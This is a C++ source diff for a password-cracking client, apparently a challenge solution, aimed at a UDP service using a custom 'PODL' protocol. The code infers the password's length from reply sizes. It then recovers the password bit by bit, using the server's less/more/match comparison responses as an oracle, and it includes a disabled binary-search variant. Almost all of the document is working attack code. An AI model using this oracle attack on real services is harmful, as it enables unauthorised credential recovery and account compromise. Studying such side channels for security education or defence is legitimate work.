@@ -22,10 +22,10 @@ Strategy1::Strategy1(int socket, struct sockaddr_in & servaddr)
 }
 
 void
-Strategy1::dump(std::string caption, std::vector<unsigned char> & dump)
+Strategy1::dump(std::string caption, Vec & dump)
 {
     std::cout << caption;
-    for (std::vector<unsigned char>::iterator iter = dump.begin();
+    for (VecIter iter = dump.begin();
         iter != dump.end(); iter++)
     {
         std::cout << " " << std::hex << std::setw(2) << std::setfill('0')
@@ -34,74 +34,148 @@ Strategy1::dump(std::string caption, std::vector<unsigned char> & dump)
     std::cout << std::endl;
 }
 
-bool
-Strategy1::attack(void)
+int Strategy1::getPasswordLength()
 {
     int passwordLength(0);
-    std::vector<unsigned char> probeResult;
+    Vec probeResult;
     PODLMessage message;
 
     // figure out how long the target password is. The server tells us by returning 1
     for (int ii = 1; ii < 256; ii++)
     {
-        std::vector<unsigned char> attackPass(ii, 'x');
+        Vec attackPass(ii, 'x');
         buildMessage(&message, attackPass);
         if (false == probe(&message, &probeResult))
         {
             std::cout << "Network failure" << std::endl;
-            return false;
+            return -1;
         }
         if (1 != probeResult.size())
         {
             passwordLength = ii;
         }
     }
+    return passwordLength;
+}
+
+bool 
+Strategy1::attack2()
+{
+#if 0
+    std::vector<unsigned char> probeResult;
+    PODLMessage message;
+    int passwordLength(getPasswordLength());
+    std::vector<unsigned char> probePassword(passwordLength, 79); // (126 - 33) / 2 + 32
+    std::vector<unsigned char> lexLess = { 1, 0 };
+    std::vector<unsigned char> lexMore = { 1, 0xff };
+
+    for (int ii = 0; ii < passwordLength; ii++)
+    {
+        int interval = 47;
+        while (true)
+        {
+            buildMessage(&message, probePassword);
+            std::cout << "Probe password " << std::string(probePassword.begin(), probePassword.end())
+                << " interval " << interval << std::endl;
+            if (false == probe(&message, &probeResult))
+            {
+                std::cout << "Network failure" << std::endl;
+                return false;
+            }
+            if (probeResult == lexLess)
+            {
+                probePassword[ii] += interval;
+            }
+            else if (probeResult == lexMore)
+            {
+                probePassword[ii] -= interval;
+            }
+            else
+            {
+                std::cout << "Discovered password "
+                    << std::string(probePassword.begin(), probePassword.end())
+                    << std::endl;
+                return true;
+            }
+            if (1 == interval)
+            {
+                break;
+            }
+            interval /= 2;
+        }
+    }
+#endif // 0
+    return false;
+}
+
+void
+Strategy1::hexDump(Vec &dump)
+{
+    for (VecIter iter = dump.begin(); iter != dump.end(); iter++)
+    {
+        std::cout << std::hex << std::setw(2) << std::setfill('0')
+            << (int)(*iter) << " " << (std::isprint(*iter) ? (char)(*iter) : '?') << " ";
+    }
+    std::cout << std::endl;
+}
+
+bool
+Strategy1::attack(void)
+{
+    Vec probeResult;
+    PODLMessage message;
+
+    int passwordLength(getPasswordLength());
 
     std::cout << "Password length is " << passwordLength << std::endl;
-    std::vector<unsigned char> probePassword(passwordLength, 79); // (126 - 32) / 2 + 32
+    Vec probePassword(passwordLength, 0x00); // (126 - 32) / 2 + 32
 
     //
     // We're assuming the password is regular ASCII
     //
-    std::vector<unsigned char> lexLess = { 1, 0 };
-    std::vector<unsigned char> lexMore = { 1, 0xff };
+    Vec lexMatch = { 1 };
+    Vec lexLess = { 1, 0 };
+    Vec lexMore = { 1, 0xff };
 
     // Start out with an empty string and set the MSB. The rcode
     // from the server will give us guidance on how to set the next
     // bit until we match the password.
-//    bool nextSet(true);
-    for (int bitIndex = 0; bitIndex < (passwordLength * 8) -1; bitIndex++)
+
+    for (int bitIndex = 1; bitIndex < (passwordLength * 8) -1; bitIndex++)
     {
         std::cout << "bitIndex " << bitIndex << std::endl;
         if (0x2b == bitIndex)
         {
             std::cout << "Now is the hour" << std::endl;
         }
-        buildMessage(&message, probePassword);
-        std::cout << "Probe password " << std::string(probePassword.begin(), probePassword.end()) << std::endl;
-        if (false == probe(&message, &probeResult))
-        {
-            std::cout << "Network failure" << std::endl;
-            return false;
-        }
         int setByte(bitIndex / 8);
         int setBit(1 << (7 - (bitIndex % 8)));
-        if (0x80 == setBit)
+
+        if (0 == (bitIndex % 8))
         {
             continue;
         }
         std::cout << "Setting byte " << setByte << " 0x"
             << std::hex << std::setw(2) << std::setfill('0')
             << setBit << std::endl;
-        if (probeResult == lexLess)
+
+        probePassword[setByte] |= setBit;
+
+        buildMessage(&message, probePassword);
+        std::cout << "Probe password:" << std::endl;
+        hexDump(probePassword);
+
+        if (false == probe(&message, &probeResult))
         {
-            probePassword[setByte] |= setBit;
+            std::cout << "Network failure" << std::endl;
+            return false;
         }
-        else if (probeResult == lexMore)
+
+        if (probeResult == lexMore)
         {
             probePassword[setByte] &= ~setBit;
         }
-        else
+        else if (probeResult == lexMatch)
         {
             break;
         }
@@ -114,7 +188,7 @@ Strategy1::attack(void)
 }
 
 bool
-Strategy1::probe(PODLMessage * msg, std::vector<unsigned char> * result)
+Strategy1::probe(PODLMessage * msg, Vec * result)
 {
     if (sendto(m_socket, (void *)msg,
         sizeof(msg->header) + msg->header.length + MD5_DIGEST_LENGTH,
@@ -201,7 +275,7 @@ Strategy1::probe(PODLMessage * msg, std::vector<unsigned char> * result)
 
 void
 Strategy1::buildMessage(PODLMessage * msg,
-     std::vector<unsigned char> & payload)
+     Vec & payload)
 {
     memcpy(msg->header.podl, "PODL", 4);
     msg->header.id = 0;
